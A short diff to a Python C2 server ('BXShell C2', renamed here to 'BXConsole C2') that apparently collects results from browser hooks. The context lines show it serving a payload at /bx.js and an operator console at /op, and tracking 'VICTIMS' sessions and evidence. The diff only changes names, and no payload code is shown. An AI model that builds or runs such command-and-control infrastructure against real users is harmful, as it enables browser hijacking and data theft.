@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""BXShell C2 v0.2 — 네트워크 훅 캡처 + 브라우저 프록시 결과 수집.
+"""BXConsole C2 v0.2 — 네트워크 훅 캡처 + 브라우저 프록시 결과 수집.
 
 실행:  python3 c2/server.py            (포트 7700, BX_C2_PORT 로 조정)
 엔드포인트:
@@ -435,7 +435,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
         elif p == "/op":
             self._send(200, "text/html", open(OPHTML).read().encode())
         else:
-            self._send(200, "text/plain", f"BXShell C2 v0.1.1 — {p}".encode())
+            self._send(200, "text/plain", f"BXConsole C2 v0.1.1 — {p}".encode())
 
     def do_POST(self):
         u = urllib.parse.urlparse(self.path); p = u.path
@@ -722,7 +722,7 @@ if __name__ == "__main__":
     load_sessions()
     threading.Thread(target=_stale_watcher, daemon=True).start()
     sess_count = len(VICTIMS) + len(CLOSED)
-    print(f"BXShell C2 v0.2  :{PORT}  | payload /bx.js | console /op | sessions: {sess_count} loaded | evidence: {EVID}")
+    print(f"BXConsole C2 v0.2  :{PORT}  | payload /bx.js | console /op | sessions: {sess_count} loaded | evidence: {EVID}")
     try:
         S(("0.0.0.0", PORT), Handler).serve_forever()
     except OSError as e:
